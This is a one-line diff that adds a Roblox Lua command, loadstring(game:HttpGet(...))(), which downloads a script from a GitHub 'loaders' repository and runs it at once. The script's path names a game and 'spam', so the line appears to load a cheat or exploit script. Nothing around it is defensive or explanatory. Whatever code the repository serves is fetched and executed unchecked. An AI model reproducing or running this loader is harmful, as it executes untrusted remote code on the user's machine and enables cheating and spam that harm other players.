@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/build-and-conquer-v0-1-spam2-1lmpv88hmjigsp.lua"))()
